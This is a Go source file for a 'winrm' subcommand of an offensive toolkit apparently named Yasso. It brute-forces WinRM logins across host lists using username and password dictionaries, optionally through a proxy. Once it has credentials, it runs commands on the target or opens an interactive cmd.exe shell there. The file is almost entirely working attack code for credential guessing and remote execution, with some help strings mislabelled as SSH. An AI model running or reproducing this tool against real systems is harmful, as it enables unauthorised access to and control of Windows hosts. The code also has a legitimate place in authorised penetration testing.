package cmd

import (
	"Yasso/config"
	"fmt"
	"github.com/masterzen/winrm"
	"github.com/spf13/cobra"
	"io"
	"net"
	"os"
)

var WinRMCmd = &cobra.Command{
	Use:   "winrm",
	Short: "winrm burst and extend tools (support proxy)",
	Run: func(cmd *cobra.Command, args []string) {
		if Hosts == "" && ConnHost == "" {
			_ = cmd.Help()
		} else {
			WinBurpByUser()
		}
	},
}

func init() {
	WinRMCmd.Flags().StringVar(&ConnHost, "hostname", "", "Open an interactive SSH at that address(brute param need false)")
	WinRMCmd.Flags().StringVar(&LoginUser, "user", "", "Login ssh username")
	WinRMCmd.Flags().StringVar(&LoginPass, "pass", "", "Login ssh password")
	WinRMCmd.Flags().BoolVar(&WinRMbool, "shell", false, "Get a cmd shell with WinRM")
	WinRMCmd.Flags().StringVarP(&SQLCommand, "cmd", "c", "", "Execute system command")
}

func WinBurpByUser() {
	if BrutePort == 0 {
		BrutePort = 5985
	}
	var ips []string
	var err error
	if Hosts != "" {
		ips, err = ResolveIPS(Hosts)
		if err != nil {
			Println(fmt.Sprintf("resolve hosts address failed %v", err))
			return
		}
		if BruteFlag == true {
			users, pass := ReadTextToDic("rdp", UserDic, PassDic) // winrm 和 rdp认证相同
			Println(Clearln + "[*] Brute Module [winrm]")
			Println(fmt.Sprintf(Clearln+"[*] Have [user:%v] [pass:%v] [request:%v]", len(users), len(pass), len(users)*len(pass)*len(ips)))
			SwitchBurp("winrm", users, pass, ips, BrutePort, Runtime, TimeDuration, "")
		} else {
			Println(Clearln + "[*] May be you want to brute? try to add --crack")
		}
	}
	if Hosts == "" && ConnHost != "" && LoginUser != "" && LoginPass != "" {
		auth, b, err := WinRMAuth(config.HostIn{Host: ConnHost, Port: BrutePort, TimeOut: TimeDuration}, LoginUser, LoginPass)
		if err != nil {
			Println(fmt.Sprintf("[!] WinRM Auth Failed %v", err))
			return
		}
		if SQLCommand != "" && b == true {
			WinRMShell(auth, SQLCommand, false)
		}
		if WinRMbool == true && b == true {
			WinRMShell(auth, "", true)
		}
	}
}

func WinRMAuth(info config.HostIn, user, pass string) (*winrm.Client, bool, error) {
	var err error
	params := winrm.DefaultParameters
	// 设置代理认证
	params.Dial = func(network, addr string) (net.Conn, error) {
		return GetConn(fmt.Sprintf("%s:%v", info.Host, info.Port), info.TimeOut)
	}
	// 设置输入
	endpoint := winrm.NewEndpoint("other-host", 5985, false, false, nil, nil, nil, 0)
	client, err := winrm.NewClientWithParameters(endpoint, user, pass, params)
	stdout := os.Stdout
	res, err := client.Run("echo ISOK > nul", stdout, os.Stderr)
	if err != nil {
		return nil, false, err
	}
	if res == 0 && err == nil {
		return client, true, nil
	}
	return nil, false, err
}

func WinRMShell(client *winrm.Client, Command string, shell bool) {
	if shell == true {
		shell, err := client.CreateShell()
		if err != nil {
			Println(fmt.Sprintf("[!] create shell failed %v", err))
			return
		}
		var cmd *winrm.Command
		cmd, err = shell.Execute("cmd.exe")
		if err != nil {
			Println(fmt.Sprintf("[!] create shell failed %v", err))
			return
		}

		go io.Copy(cmd.Stdin, os.Stdin)
		go io.Copy(os.Stdout, cmd.Stdout)
		go io.Copy(os.Stderr, cmd.Stderr)
		cmd.Wait()
		shell.Close()
	} else {
		_, err := client.Run(Command, os.Stdout, os.Stderr)
		if err != nil {
			Println(fmt.Sprintf("[!] Execute Command failed %v", err))
			return
		}
	}
}
